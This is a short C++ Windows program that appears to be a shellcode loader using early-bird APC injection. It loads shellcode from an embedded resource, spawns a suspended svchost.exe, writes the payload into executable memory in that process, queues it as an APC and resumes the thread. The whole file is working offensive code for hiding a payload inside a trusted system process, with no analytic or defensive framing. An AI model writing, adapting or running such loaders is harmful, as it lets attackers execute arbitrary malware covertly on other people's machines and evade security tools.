#include"..\public.hpp"

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	//1.Get shellcode and shellcodesize from Resource by ID
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}
	//2.Get shellcode memory
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//3.Execute shellcode
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);
	return 0;
}